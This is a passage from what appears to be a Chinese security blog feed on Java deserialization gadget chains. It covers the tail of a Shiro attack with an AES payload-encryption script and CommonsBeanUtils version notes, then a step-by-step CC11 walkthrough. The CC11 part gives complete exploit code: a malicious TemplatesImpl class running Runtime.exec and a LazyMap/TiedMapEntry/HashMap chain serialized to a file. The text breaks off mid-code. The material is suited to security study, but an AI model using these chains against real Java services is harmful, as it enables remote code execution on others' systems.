class="number">16</span>:])</span><br><span class="line"> plaintext = unpad(plaintext)</span><br><span class="line"> <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"> data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line"> <span class="built_in">print</span>(aes_enc(data))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我尝试CC1时发现这里报了一个错导致不成功</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240823141018860.png" alt="image-20240823141018860"></p><p>Transformer数组似乎无法被反序列化</p><p>之后又尝试CB链子还是爆错:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962</span><br></pre></td></tr></table></figure><p>得知是版本问题</p><blockquote><p>如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 <code>serialVersionUID</code> 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 <code>serialVersionUID</code> 不同，则反序列化就会异常退出，避免后续的未知隐患。</p></blockquote><p>服务端的cb版本是1.8.3, 而我使用1.9.2版本序列化数据导致错误</p><p>用对应的版本就可以了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240823144456939.png" alt="image-20240823144456939"></p><p>至于cc为什么没有成功</p><blockquote><p>commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>遗漏的CC11和CommonsBeanUtils链</title>
      <link href="/2024/07/22/%E7%9A%84CC11%E5%92%8CCommonsBeanUtils%E9%93%BE/"/>
      <url>/2024/07/22/%E7%9A%84CC11%E5%92%8CCommonsBeanUtils%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="遗漏的CC11和CommonsBeanUtils链"><a href="#遗漏的CC11和CommonsBeanUtils链" class="headerlink" title="遗漏的CC11和CommonsBeanUtils链"></a>遗漏的CC11和CommonsBeanUtils链</h1><p>之前我写了一篇专门分析cc链子的博客, 没有包含这位两条链子, 这里进行补充</p><h2 id="CC11"><a href="#CC11" class="headerlink" title="CC11"></a>CC11</h2><p>cc11对java版本没有限制, 我依然使用的是经典的jdk8u65</p><p>仍然是经典的cc依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>相信大家对这个版本已经是非常熟悉了, 这里就不多赘述了</p><p>cc11实际上是前面我们分析过的链子拼接来的, 它是利用的动态类加载</p><p>首先回忆一下, 在java核心库中, com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类是可以进行任意类加载的, 我在cc3中首次分析了这个类的利用, 这里cc11也是利用了这个类并结合cc6的首部来触发</p><p>让我们再来分析一遍</p><p>首先找到com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类, 他有一个defineClass方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722230820146.png" alt="image-20240722230820146"></p><p>这个方法返回一个类, 也就是一个动态类加载</p><p>我们找谁调用了这个方法</p><p>很容易找到在同一个类下有一次调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722230947998.png" alt="image-20240722230947998"></p><p>可这个defineTransletClasses依然是一个私有类型, 我们不能用cc6来调用这个方法, 所以继续寻找谁调用了defineTransletClasses方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722231426843.png" alt="image-20240722231426843"></p><p>我们可以找到getTransletInstance这个类, 不过它依然是私有</p><p>继续寻找</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722231657354.png" alt="image-20240722231657354"></p><p>这个newTransformer就是可以从外部访问的了</p><p>至此大概流程是这样的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722232705864.png" alt="image-20240722232705864"></p><p>这里需要注意的几个点就是一些必要的赋值, 之前在CC3中也分析过了, 这里再简单看一遍</p><p>newTransformer到getTransletInstance没有什么判断</p><p>看getTransletInstance到defineTransletClasses</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722231426843.png" alt="image-20240722231426843"></p><p>两个if判断, 要进入defineTransletClasses就需要_name不为null, _class为null</p><p>我们ctrl+鼠标左点到上面可以看见这两个属性的类型</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723124531024.png" alt="image-20240723124531024"></p><p>按照要求反射赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>接下来是defineTransletClasses到defineClass这一步</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722230947998.png" alt="image-20240722230947998"></p><p>这里的_bytecodes就是我们要加载类的字节码</p><p>注意它的类型是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>首先我们先编译一个恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CC11&quot;</span>);<span class="comment">//不会执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用javac编译后获取它的字节码并赋值给_bytecodes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br></pre></td></tr></table></figure><p>至此这里似乎就已经通了, 我们先直接调用newTransformer()试试</p><p>发现会报错</p><p>定位到最后错误的这一行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723131418268.png" alt="image-20240723131418268"></p><p>打断点调试</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723131511941.png" alt="image-20240723131511941"></p><p>发现这里_tfactory是空, 导致报错出错误了</p><p>我们去看这个_tfactory的定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>transient修饰使得_tfactory不被序列化进数据流, 所以即使现在我们反射给它赋值了, 序列化后它还是空值</p><p>我们不妨看看这个属性是否在其他地方进行了赋值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723132345064.png" alt="image-20240723132345064"></p><p>我们在该类的<code>readObject</code>方法中发现了一次赋值, 也就是说, 实际上我们根本不需要对他赋值, 反序列化后会自动给_tfactory赋值</p><p>这里我们先反射赋一个相同的值测试这一段链子是否流通</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>());</span><br></pre></td></tr></table></figure><p>再次测试, 发现还是报错</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723133534887.png" alt="image-20240723133534887"></p><p>我们点击Creat breakpoint在抛出空指针错误的地方打断点</p><p>debug一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723133820653.png" alt="image-20240723133820653"></p><p>发现这个if里面会判断恶意类的父类必须是<code>ABSTRACT_TRANSLET</code>,  不然会去else里导致抛出错误, 我们点进去看看这个ABSTRACT_TRANSLET</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723134348495.png" alt="image-20240723134348495"></p><p>所以需要将恶意类继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</p><p>继承这个类需要实现对应的方法, 用idea自动帮我们实现就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CC11&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再次测试, 就可以弹出计算器啦!!!</p><p>至此后半链子就完成了</p><p>贴一下exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来就是要拼接上CC6的前半链子</p><p>我们先看一下CC6这条链子是什么样的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330121419699.png" alt="image-20240330121419699"></p><p>我们只需要执行调用newTransformer()这一个方法即可</p><p>所以大概流程就是这样</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723142611703.png" alt="image-20240723142611703"></p><p>不过实际上可以简化一部, 我们可以不使用HashSet.readObject() 作为入口, </p><p>在HashMap.readObject()的最后有这样一部调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723234352058.png" alt="image-20240723234352058"></p><p>这里可以直接调用到HashMap.hash(), 因此:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723234431270.png" alt="image-20240723234431270"></p><p>直接写出较短的那条</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(innermap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;cabbage&quot;</span>);</span><br><span class="line">        innermap.remove(<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;cc11.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc11.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有一个小问题就是关于这里最后为什么innermap里存在一个<code>&#123;&quot;n4c1&quot;: 1&#125;</code>键值对(因此我们需要 innermap.remove(“n4c1”);把它删掉)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(innermap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;cabbage&quot;</span>);</span><br><span class="line">        innermap.remove(<span 